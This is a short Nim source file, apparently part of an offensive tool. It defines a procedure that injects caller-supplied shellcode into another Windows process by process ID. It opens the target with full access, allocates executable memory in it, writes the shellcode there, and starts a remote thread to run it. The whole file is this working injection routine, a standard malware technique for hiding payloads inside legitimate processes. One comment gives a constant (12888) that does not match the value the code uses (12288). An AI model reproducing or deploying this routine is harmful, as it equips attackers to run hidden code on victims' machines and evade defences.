import winim/lean
# import asyncdispatch

# proc execute*(sc: openarray[char], pid: int): Future[bool] {.async.}  =
# TODO determine if possible to make proc async  
proc execute*(sc: openarray[char], pid: int): bool =  
    # TODO add Linux support        
    when defined(windows):
        let hProcess = OpenProcess(0x001F0FFF, false, cast[DWORD](pid))
        # 12888 == 0x1000 | 0x2000
        let alloc = VirtualAllocEx(hProcess, NULL, cast[SIZE_T](sc.len), 12288, 0x40)
        discard WriteProcessMemory(hProcess, alloc, unsafeAddr sc, cast[SIZE_T](sc.len), NULL)
        let temp = cast[LPTHREAD_START_ROUTINE](alloc)
        discard CreateRemoteThread(hProcess, NULL, 0, temp, NULL, 0, NULL)
    result = true
